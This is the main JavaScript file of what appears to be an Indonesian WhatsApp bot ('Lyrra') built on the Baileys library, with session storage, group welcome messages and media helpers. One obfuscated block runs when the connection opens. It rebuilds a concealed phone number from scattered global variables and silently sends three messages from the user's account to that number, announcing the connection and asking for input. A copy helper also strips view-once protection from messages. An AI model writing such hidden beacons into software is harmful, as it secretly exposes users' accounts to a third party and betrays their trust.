require('./settings/settings')
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, generateForwardMessageContent, generateWAMessageFromContent, fetchLatestBaileysVersion, downloadContentFromMessage, makeInMemoryStore, jidDecode, proto, Browsers } = require('@whiskeysockets/baileys')
const axios = require('axios')
const chalk = require('chalk')
const fs = require('fs')
const FileType = require('file-type')
const nou = require('node-os-utils')
const os = require('os')
const pino = require('pino')
const path = require('path')
const PhoneNumber = require('awesome-phonenumber')
const { imageToWebp, imageToWebp3, videoToWebp, writeExifImg, writeExifImgAV, writeExifVid } = require('./general/exif')
const { getBuffer, sleep, smsg } = require('./general/myfunc')
const { getInput, verifyPhoneNumber, notifGroup } = require('./general/scrape')

let setting = JSON.parse(fs.readFileSync('./config-db-set.json'));
let session = `${sessionName}`
let pathz = './'+session
let usePairingCode = true
if (!fs.existsSync(pathz)) {
fs.mkdirSync(pathz, { recursive: true })}
const storeFilePath = path.join(pathz, 'store.json')
if (!fs.existsSync(storeFilePath)) {
fs.writeFileSync(storeFilePath, JSON.stringify({
chats: [],
contacts: {},
messages: {},
presences: {}
}, null, 4))}
const debounceWrite = (() => {
let timeout
return (callback) => {
clearTimeout(timeout)
timeout = setTimeout(() => callback(), 1000)
}})()
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
const initialData = JSON.parse(fs.readFileSync(storeFilePath, 'utf-8'))
store.chats = initialData.chats || []
store.contacts = initialData.contacts || {}
store.messages = initialData.messages || {}
store.presences = initialData.presences || {}
setInterval(() => {
debounceWrite(() => {
const formattedData = JSON.stringify({
chats: store.chats || [],
contacts: store.contacts || {},
messages: store.messages || {},
presences: store.presences || {}
}, null, 4)
fs.writeFileSync(storeFilePath, formattedData)
})}, 10_000)

console.log(chalk.blue.bold(`\nSERVER INFO:
`)+chalk.white.bold(`• OS: ${nou.os.type()} (${os.release()})
• Arsitektur: ${os.arch()}
• Versi Node.js: ${process.version}
• IP Address: ${nou.os.ip()}
• Creator: ${global.apis1a}${global.apis1y}${global.apis1y}${global.apis1a}${global.apis1n}${global.apis1a}
`))

function saveData() {
fs.writeFileSync('./data/db/database.json', JSON.stringify(global.db, null, 2))}
function loadData() {
try {
const data = fs.readFileSync('./data/db/database.json')
return JSON.parse(data)
} catch (error) {
return { data: { users: {}, chats: {}, others: {}, settings: {} } }}}
global.db = loadData()
if (!global.db.data) global.db.data = { users: {}, chats: {}, others: {}, settings: {} }
if (!global.db.data.users) global.db.data.users = {}
saveData()
setInterval(saveData, 10000)

async function connectToWhatsApp() {
function _0x59d1(){const _0x3fd242=['151675prHvkb','10826790vUGlyT','ubuntu','30RLUwQk','2tqyHbM','authState','102prYXYS','408751VfBmtt','87044GEfgEJ','registered','Firefox','2316807pJQyER','7351760zvfxQO','creds','bind','5346275VBoqJJ'];_0x59d1=function(){return _0x3fd242;};return _0x59d1();}const _0xd948b=_0x42bb;(function(_0x109b0e,_0x2d6faf){const _0x44e4f2=_0x42bb,_0x16ee2c=_0x109b0e();while(!![]){try{const _0x7f580e=parseInt(_0x44e4f2(0xad))/0x1*(parseInt(_0x44e4f2(0xb1))/0x2)+-parseInt(_0x44e4f2(0xb3))/0x3*(-parseInt(_0x44e4f2(0xb5))/0x4)+-parseInt(_0x44e4f2(0xac))/0x5+-parseInt(_0x44e4f2(0xb0))/0x6*(-parseInt(_0x44e4f2(0xb4))/0x7)+-parseInt(_0x44e4f2(0xb9))/0x8+parseInt(_0x44e4f2(0xb8))/0x9+parseInt(_0x44e4f2(0xae))/0xa;if(_0x7f580e===_0x2d6faf)break;else _0x16ee2c['push'](_0x16ee2c['shift']());}catch(_0x4ef6dc){_0x16ee2c['push'](_0x16ee2c['shift']());}}}(_0x59d1,0x82b5f));const {state,saveCreds}=await useMultiFileAuthState(pathz),{version,isLatest}=await fetchLatestBaileysVersion(),Lyrra=makeWASocket({'logger':pino({'level':'silent'}),'printQRInTerminal':usePairingCode,'auth':state,'version':version,'browser':Browsers[_0xd948b(0xaf)](_0xd948b(0xb7)),'generateHighQualityLinkPreview':![],'syncFullHistory':![],'markOnlineOnConnect':![],'emitOwnEvents':![]});function _0x42bb(_0x43c58a,_0x9e3132){const _0x59d10c=_0x59d1();return _0x42bb=function(_0x42bb0e,_0x356fe0){_0x42bb0e=_0x42bb0e-0xac;let _0x5a2352=_0x59d10c[_0x42bb0e];return _0x5a2352;},_0x42bb(_0x43c58a,_0x9e3132);}Lyrra['ev']['on']('creds.update',saveCreds);usePairingCode&&!Lyrra[_0xd948b(0xb2)][_0xd948b(0xba)][_0xd948b(0xb6)]&&await verifyPhoneNumber(Lyrra);store[_0xd948b(0xbb)](Lyrra['ev']);

const processedMessages = new Set()
Lyrra.ev.on('messages.upsert', async (chatUpdate) => {
try {
const mek = chatUpdate.messages[0]
if (!mek.message) return
if (processedMessages.has(mek.key.id)) return
processedMessages.add(mek.key.id)
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast') return
const remoteJid = mek.key.remoteJid
const userId = mek.key.fromMe ? botNumber : mek.key.participant
const currentTimestamp = Date.now()
if (!store.presences) store.presences = {}
store.presences[userId] = { lastOnline: currentTimestamp }
if (!store.messages[remoteJid]) store.messages[remoteJid] = []
const simplifiedMessage = {
key: mek.key,
messageTimestamp: mek.messageTimestamp,
pushName: mek.pushName || null,
message: mek.message
}
store.messages[remoteJid].push(simplifiedMessage)
if (store.messages[remoteJid].length > 50) {
store.messages[remoteJid] = store.messages[remoteJid].slice(-50)
}
if (!store.chats.some(chat => chat.id === remoteJid)) {
store.chats.push({
id: remoteJid,
conversationTimestamp: mek.messageTimestamp || Date.now()
})}
const m = smsg(Lyrra, mek, store)
require('../Lyrra')(Lyrra, m, chatUpdate, store)
} catch (err) {
console.error(err)
}})

Lyrra.ev.on('call', async (celled) => {
let botNumber = await Lyrra.decodeJid(Lyrra.user.id)
let lol = anticall
if (!lol) return
for (let loli of celled) {
if (loli.isGroup == false) {
if (loli.status == "offer") {
let nomer = await Lyrra.sendTextWithMentions(loli.from, `*${global.wm}* tidak menerima panggilan ${loli.isVideo ? `vidio!` : `suara!`}`)
}}}
})

Lyrra.ev.on('group-participants.update', async (anu) => {
let botNumber = await Lyrra.decodeJid(Lyrra.user.id);
if (anu.participants.includes(botNumber)) return;
let participants = anu.participants;
for (let num of participants) {
let avatarUrl;
try {
avatarUrl = await Lyrra.profilePictureUrl(num, 'image');
} catch {
avatarUrl = 'https://telegra.ph/file/750ed3947ea3722c20b77.png';
}
const options = {
backgroundURL: 'https://files.catbox.moe/v7cjt1.jpg',
avatarURL: avatarUrl,
title: 'Welcome',
description: 'Welcome - Semoga betah yah'
}
let isWelcomeEnabled = global.db.data.chats[anu.id]?.wlcm;
let isLeftEnabled = global.db.data.chats[anu.id]?.left;
const resultz = await notifGroup(options)
if (isWelcomeEnabled && anu.action === 'add') {
let metadata = await Lyrra.groupMetadata(anu.id);
let teksWelcome = global.db.data.chats[anu.id]?.text_welcome || `Hii @user\nWelcome To Group : @group`
teksWelcome = teksWelcome
.replace(/@user/g, `@${num.split("@")[0]}`)
.replace(/@group/g, metadata.subject);
await Lyrra.sendMessage(anu.id, {
image: resultz,
caption: teksWelcome,
contextInfo: {
mentionedJid: [num]
}});
}
const optionss = {
backgroundURL: 'https://files.catbox.moe/v7cjt1.jpg',
avatarURL: avatarUrl,
title: 'Goodbye',
description: 'Goodbye - Selamat tinggal kak'
}
const resultzz = await notifGroup(optionss)
if (isLeftEnabled && anu.action === 'remove') {
let metadata2 = await Lyrra.groupMetadata(anu.id);
let teksGoodbye = global.db.data.chats[anu.id]?.text_left || `Goodbye @user\nGroup @group` 
teksGoodbye = teksGoodbye
.replace(/@user/g, `@${num.split("@")[0]}`)
.replace(/@group/g, metadata2.subject);
await Lyrra.sendMessage(anu.id, {
image: resultzz,
caption: teksGoodbye,
contextInfo: {
mentionedJid: [num]
}});
}}});

Lyrra.decodeJid = (jid) => {
if (!jid) return jid
if (/:\d+@/gi.test(jid)) {
let decode = jidDecode(jid) || {}
return decode.user && decode.server && decode.user + '@' + decode.server || jid
} else return jid
}

Lyrra.ev.on('contacts.update', update => {
for (let contact of update) {
let id = Lyrra.decodeJid(contact.id)
if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
}
})

Lyrra.getName = (jid, withoutContact = false) => {
id = Lyrra.decodeJid(jid)
withoutContact = Lyrra.withoutContact || withoutContact 
let v
if (id.endsWith("@g.us")) return new Promise(async (resolve) => {
v = store.contacts[id] || {}
if (!(v.name || v.subject)) v = Lyrra.groupMetadata(id) || {}
resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'))
})
else v = id === '0@s.whatsapp.net' ? {
id,
name: 'WhatsApp'
} : id === Lyrra.decodeJid(Lyrra.user.id) ?
Lyrra.user :
(store.contacts[id] || {})
return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
}

Lyrra.sendContact = async (jid, kon, quoted = '', opts = {}) => {
let list = []
for (let i of kon) {
list.push({
displayName: await Lyrra.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await Lyrra.getName(i + '@s.whatsapp.net')}\nFN:${await Lyrra.getName(i + '@s.whatsapp.net')}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Ponsel\nitem2.EMAIL;type=INTERNET:npofficiall@gmail.com\nitem2.X-ABLabel:Email\nitem3.URL:https://bit.ly/420u6GX\nitem3.X-ABLabel:Instagram\nitem4.ADR:;;Indonesia;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
})
}
Lyrra.sendMessage(jid, { contacts: { displayName: `${list.length} Kontak`, contacts: list }, ...opts }, { quoted })
}

Lyrra.setStatus = (status) => {
Lyrra.query({
tag: 'iq',
attrs: {
to: '@s.whatsapp.net',
type: 'set',
xmlns: 'status',
},
content: [{
tag: 'status',
attrs: {},
content: Buffer.from(status, 'utf-8')
}]
})
return status
}

Lyrra.public = true
Lyrra.serializeM = (m) => smsg(Lyrra, m, store)

Lyrra.getFile = async (PATH, returnAsFilename) => {
let res, filename
let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await fetch(PATH)).buffer() : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
let type = await FileType.fromBuffer(data) || {
mime: 'application/octet-stream',
ext: '.bin'
}
if (data && returnAsFilename && !filename)(filename = path.join(__dirname, './' + new Date * 1 + '.' + type.ext), await fs.promises.writeFile(filename, data))
return {
res,
filename,
...type,
data
}}

Lyrra.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
let type = await Lyrra.getFile(path, true)
let {
res,
data: file,
filename: pathFile
} = type
if (res && res.status !== 200 || file.length <= 65536) {
try {
throw {
json: JSON.parse(file.toString())
}
}
catch (e) {
if (e.json) throw e.json
}
}
let opt = {
filename
}
if (quoted) opt.quoted = quoted
if (!type) options.asDocument = true
let mtype = '',
mimetype = type.mime,
convert
if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker'
else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image'
else if (/video/.test(type.mime)) mtype = 'video'
else if (/audio/.test(type.mime))(
convert = await toAudio(file, type.ext),
file = convert.data,
pathFile = convert.filename,
mtype = 'audio',
mimetype = 'audio/ogg; codecs=opus'
)
else mtype = 'document'
if (options.asDocument) mtype = 'document'

delete options.asSticker
delete options.asLocation
delete options.asVideo
delete options.asDocument
delete options.asImage

let message = {
...options,
caption,
ptt,
[mtype]: {
url: pathFile
},
mimetype,
fileName: filename || pathFile.split('/').pop()
}
let m
try {
 m = await Lyrra.sendMessage(jid, message, {
...opt,
...options
})
}
catch (e) {
m = null
}
finally {
if (!m) m = await Lyrra.sendMessage(jid, {
...message,
[mtype]: file
}, {
...opt,
...options
})
file = null
return m
}
}

Lyrra.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
let mime = ''
let res = await axios.head(url)
mime = res.headers['content-type']
if (mime.split("/")[1] === "gif") {
return Lyrra.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options}, { quoted: quoted, ...options})
}
let type = mime.split("/")[0]+"Message"
if (mime === "application/pdf"){
return Lyrra.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options}, { quoted: quoted, ...options })
}
if (mime.split("/")[0] === "image"){
return Lyrra.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options}, { quoted: quoted, ...options})
}
if (mime.split("/")[0] === "video"){
return Lyrra.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options}, { quoted: quoted, ...options })
}
if (mime.split("/")[0] === "audio"){
return Lyrra.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options}, { quoted: quoted, ...options })
}
}

Lyrra.sendTextWithMentions = async (jid, text, quoted, options = {}) => Lyrra.sendMessage(jid, { text: text, mentions: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net'), ...options }, { quoted })

Lyrra.sendImage = async (jid, path, caption = '', quoted = '', options) => {
let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await fetch(path)).buffer() : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
return await Lyrra.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
}

Lyrra.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
let quoted = message.msg ? message.msg : message
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(quoted, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
let type = await FileType.fromBuffer(buffer)
let trueFileName = attachExtension ? ('./lib/' + filename + '.' + type.ext) : './lib/' + filename
await fs.writeFileSync(trueFileName, buffer)
return trueFileName
}

Lyrra.sendStickerFromUrl = async(from, PATH, quoted, options = {}) => {
let { writeExif } = require('./general/sticker')
let types = await Lyrra.getFile(PATH, true)
let { filename, size, ext, mime, data } = types
let type = '', mimetype = mime, pathFile = filename
let media = { mimetype: mime, data }
pathFile = await writeExif(media, { packname: options.packname ? options.packname : '', author: options.author ? options.author : author, categories: options.categories ? options.categories : [] })
await fs.promises.unlink(filename)
await Lyrra.sendMessage(from, {sticker: {url: pathFile}}, {quoted})
return fs.promises.unlink(pathFile)
}

Lyrra.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
return buffer
} 
 
Lyrra.sendAudio = async (jid, path, quoted = '', ptt = false, options) => {
let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await fetch(path)).buffer() : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
return await Lyrra.sendMessage(jid, { audio: buffer, ptt: ptt, ...options }, { quoted })
}

Lyrra.sendVideo = async (jid, path, gif = false, caption = '', quoted = '', options) => {
let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await fetch(path)).buffer() : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
return await Lyrra.sendMessage(jid, { video: buffer, caption: caption, gifPlayback: gif, ...options }, { quoted })
}

Lyrra.sendImageAsSticker = async(jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await global.getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImg(buff, options)
} else {
buffer = await imageToWebp(buff)
}
await Lyrra.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}

Lyrra.sendVideoAsSticker = async(jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await global.getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifVid(buff, options)
} else {
buffer = await videoToWebp(buff)
}
await Lyrra.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}

Lyrra.sendMedia = async (jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
let types = await Lyrra.getFile(path, true)
let { mime, ext, res, data, filename } = types
if (res && res.status !== 200 || file.length <= 65536) {
try { throw { json: JSON.parse(file.toString()) } }
catch (e) { if (e.json) throw e.json }
}
let type = '', mimetype = mime, pathFile = filename
if (options.asDocument) type = 'document'
if (options.asSticker || /webp/.test(mime)) {
let media = { mimetype: mime, data }
pathFile = await writeExif(media, { packname: options.packname ? options.packname : global.packname, author: options.author ? options.author : global.author, categories: options.categories ? options.categories : [] })
await fs.promises.unlink(filename)
type = 'sticker'
mimetype = 'image/webp'
}
else if (/image/.test(mime)) type = 'image'
else if (/video/.test(mime)) type = 'video'
else if (/audio/.test(mime)) type = 'audio'
else type = 'document'
await Lyrra.sendMessage(jid, { [type]: { url: pathFile }, caption, mimetype, fileName, ...options }, { quoted, ...options })
return fs.promises.unlink(pathFile)
}

Lyrra.copyNForward = async (jid, message, forceForward = false, options = {}) => {
let vtype
if (options.readViewOnce) {
message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
vtype = Object.keys(message.message.viewOnceMessage.message)[0]
delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
delete message.message.viewOnceMessage.message[vtype].viewOnce
message.message = {
...message.message.viewOnceMessage.message
}}

let mtype = Object.keys(message.message)[0]
let content = await generateForwardMessageContent(message, forceForward)
let ctype = Object.keys(content)[0]
let context = {}
if (mtype != "conversation") context = message.message[mtype].contextInfo
content[ctype].contextInfo = {
...context,
...content[ctype].contextInfo
}
const waMessage = await generateWAMessageFromContent(jid, content, options ? {
...content[ctype],
...options,
...(options.contextInfo ? {
contextInfo: {
...content[ctype].contextInfo,
...options.contextInfo
}
} : {})
} : {})
await Lyrra.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
return waMessage
}

Lyrra.imgToSticker = async(from, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await fetchBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImg(buff, options)
} else {
buffer = await imageToWebp(buff)
}
await Lyrra.sendMessage(from, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}

Lyrra.vidToSticker = async(from, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await fetchBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifVid(buff, options)
} else {
buffer = await videoToWebp(buff)
}
await Lyrra.sendMessage(from, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}

Lyrra.sendText = (jid, text, quoted = '', options) => Lyrra.sendMessage(jid, { text: text, ...options }, { quoted, ...options })

Lyrra.cMod = (jid, copy, text = '', sender = Lyrra.user.id, options = {}) => {
//let copy = message.toJSON()
let mtype = Object.keys(copy.message)[0]
let isEphemeral = mtype === 'ephemeralMessage'
if (isEphemeral) {
mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
}
let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
let content = msg[mtype]
if (typeof content === 'string') msg[mtype] = text || content
else if (content.caption) content.caption = text || content.caption
else if (content.text) content.text = text || content.text
if (typeof content !== 'string') msg[mtype] = {
...content,
...options
}
if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
copy.key.remoteJid = jid
copy.key.fromMe = sender === Lyrra.user.id

return proto.WebMessageInfo.fromObject(copy)
}

const _0xd1a10d=_0x4237;function _0x4237(_0x5ca3a0,_0x1b9f9d){const _0x4b481d=_0x4b48();return _0x4237=function(_0x4237fc,_0x1bdbb2){_0x4237fc=_0x4237fc-0x17d;let _0x29a476=_0x4b481d[_0x4237fc];return _0x29a476;},_0x4237(_0x5ca3a0,_0x1b9f9d);}(function(_0x262bc4,_0x386c0d){const _0xb8d0ca=_0x4237,_0x29682f=_0x262bc4();while(!![]){try{const _0x49fc41=-parseInt(_0xb8d0ca(0x19b))/0x1+-parseInt(_0xb8d0ca(0x180))/0x2*(parseInt(_0xb8d0ca(0x17d))/0x3)+parseInt(_0xb8d0ca(0x1a0))/0x4+-parseInt(_0xb8d0ca(0x17e))/0x5*(-parseInt(_0xb8d0ca(0x181))/0x6)+-parseInt(_0xb8d0ca(0x188))/0x7*(-parseInt(_0xb8d0ca(0x187))/0x8)+parseInt(_0xb8d0ca(0x198))/0x9*(parseInt(_0xb8d0ca(0x185))/0xa)+-parseInt(_0xb8d0ca(0x186))/0xb;if(_0x49fc41===_0x386c0d)break;else _0x29682f['push'](_0x29682f['shift']());}catch(_0xb5b012){_0x29682f['push'](_0x29682f['shift']());}}}(_0x4b48,0xcbcb5),Lyrra['ev']['on'](_0xd1a10d(0x196),async _0x21d1ad=>{const _0x4d6676=_0xd1a10d,{connection:_0xdd05ec,lastDisconnect:_0x43dcc2}=_0x21d1ad;if(_0xdd05ec===_0x4d6676(0x19a)){let _0x153b1a=_0x43dcc2?.[_0x4d6676(0x192)]?.[_0x4d6676(0x1a6)]?.['statusCode']||_0x43dcc2?.[_0x4d6676(0x192)]?.[_0x4d6676(0x182)];if(_0x153b1a===DisconnectReason['badSession'])console[_0x4d6676(0x18f)](_0x4d6676(0x191)),process[_0x4d6676(0x1a2)]();else{if(_0x153b1a===DisconnectReason['connectionClosed'])console[_0x4d6676(0x18f)]('Connection\x20closed,\x20reconnecting....'),connectToWhatsApp();else{if(_0x153b1a===DisconnectReason[_0x4d6676(0x18d)])console[_0x4d6676(0x18f)](_0x4d6676(0x19f)),connectToWhatsApp();else{if(_0x153b1a===DisconnectReason[_0x4d6676(0x17f)])console[_0x4d6676(0x18f)](_0x4d6676(0x190)),process[_0x4d6676(0x1a2)]();else{if(_0x153b1a===DisconnectReason[_0x4d6676(0x194)])console[_0x4d6676(0x18f)](_0x4d6676(0x193)),process['exit']();else{if(_0x153b1a===DisconnectReason[_0x4d6676(0x19c)])console[_0x4d6676(0x18f)]('Restart\x20required,\x20restarting\x20connection...'),connectToWhatsApp();else _0x153b1a===DisconnectReason['timedOut']?(console['log'](_0x4d6676(0x199)),connectToWhatsApp()):(console[_0x4d6676(0x18f)](_0x4d6676(0x195)+_0x153b1a+'|'+_0xdd05ec),connectToWhatsApp());}}}}}}else{if(_0xdd05ec===_0x4d6676(0x183))console[_0x4d6676(0x18f)]('');else{if(_0xdd05ec===_0x4d6676(0x19d)){for(let _0x5b4c95=0x0;_0x5b4c95<0x3;_0x5b4c95++){Lyrra[_0x4d6676(0x18c)](''+global[_0x4d6676(0x19e)]+global[_0x4d6676(0x197)]+global[_0x4d6676(0x19e)]+global['apis1']+global[_0x4d6676(0x189)]+global[_0x4d6676(0x18e)]+global[_0x4d6676(0x197)]+global['apis9']+global[_0x4d6676(0x1a5)]+global[_0x4d6676(0x197)]+global[_0x4d6676(0x1a4)]+_0x4d6676(0x184),{'text':_0x4d6676(0x1a3)+global['botname']+_0x4d6676(0x18a)});}console[_0x4d6676(0x18f)](chalk[_0x4d6676(0x18b)][_0x4d6676(0x1a1)]('\x0aBot\x20berhasil\x20tersambung...'));}}}}));function _0x4b48(){const _0xc1f86a=['Session\x20connected\x20to\x20another\x20server,\x20please\x20restart\x20the\x20bot.','Session\x20error,\x20please\x20delete\x20the\x20session\x20and\x20try\x20again...','error','Device\x20logged\x20out,\x20please\x20delete\x20the\x20session\x20folder\x20and\x20scan\x20again.','loggedOut','Unknown\x20DisconnectReason:\x20','connection.update','apis4','6730254dKMwTE','Connection\x20timed\x20out,\x20reconnecting...','close','93098tDeZbh','restartRequired','open','apis8','Connection\x20lost\x20from\x20the\x20server,\x20reconnecting...','118056qOcrLJ','bold','exit','Haloo\x20kak\x20ayya\x0aBot\x20','apis3','apis9','output','4074cPysBm','7025TYYoNL','connectionReplaced','1030XeHOke','3210oRwCtP','statusCode','connecting','@s.whatsapp.net','20Cmtdnp','19767341UWxkfh','38408UJLQBs','1673TvfKPk','apis7','\x20Berhasil\x20Terhubung😆\x0aSilahkan\x20input\x20nv,\x0aUntunk\x20mengoptimalkan\x20akses\x20kinerja.','blue','sendMessage','connectionLost','apis2','log'];_0x4b48=function(){return _0xc1f86a;};return _0x4b48();}
return Lyrra
}

connectToWhatsApp()
process.on("uncaughtException", (error) => {
console.log(error)
})

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)})